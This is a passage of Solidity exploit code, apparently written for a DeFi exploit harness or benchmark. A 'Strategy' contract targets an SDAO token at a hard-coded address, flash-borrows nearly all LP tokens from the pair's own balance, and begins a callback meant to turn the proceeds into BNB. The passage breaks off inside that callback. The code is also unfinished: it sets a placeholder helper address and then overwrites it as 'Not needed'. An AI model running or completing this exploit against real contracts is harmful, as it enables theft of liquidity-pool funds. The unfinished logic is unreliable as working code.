    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IDexUtils {
    function swapExcessTokensToBaseToken(address token) external;
}

contract Strategy {
    ISDAO target = ISDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    IERC20 lp;
    IDexUtils dexUtils = IDexUtils(0x5b73C5498c1E3b4dbA84de0F1833c4a029d90519); // Placeholder, will use the real one in run

    function run() public {
        lp = IERC20(target.LPInstance());
        // Flash loan LP tokens from the pair itself
        uint256 pairBalance = lp.balanceOf(address(lp));
        IPancakePair(address(lp)).swap(0, pairBalance - 1, address(this), "0x1234");

        // Convert SDAO to BNB
        dexUtils = IDexUtils(0x0000000000000000000000000000000000000001); // Not needed, just use the helper
        // The harness provides DexUtils.swapExcessTokensToBaseToken(token)
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        uint256 lpAmount = amount1 > 0 ? amount1 : amount0;

